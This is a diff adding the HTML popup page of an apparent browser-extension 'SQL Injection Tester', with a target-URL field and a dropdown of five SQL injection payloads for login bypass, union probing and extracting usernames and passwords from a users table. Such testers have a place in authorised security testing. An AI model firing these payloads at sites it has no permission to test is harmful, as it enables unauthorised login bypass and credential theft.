@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection Tester</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <h2>SQL Injection Tester</h2>
+    
+    <form id="sqlForm">
+        <input type="text" id="targetUrl" placeholder="Enter target URL (e.g., http://example.com/login.php)" required>
+        
+        <label for="payloads">Select a payload:</label>
+        <select id="payloads" title="Select a payload">
+            <option value="' OR '1'='1' --">Basic Auth Bypass</option>
+            <option value="' UNION SELECT null, null --">Union-Based</option>
+            <option value="' AND 1=0 UNION SELECT username, password FROM users --">Extract Users</option>
+            <option value="' OR 1=1#">Bypass Authentication</option>
+            <option value="' OR 1=1 /*">Bypass with Comment</option>
+        </select>
+
+        <button type="submit" id="testButton">Test SQL Injection</button>
+    </form>
+
+    <div id="result">
+        <h3>Results:</h3>
+        <pre id="responseOutput"></pre>
+    </div>
+
+    <script src="popup.js"></script>
+</body>
+</html>
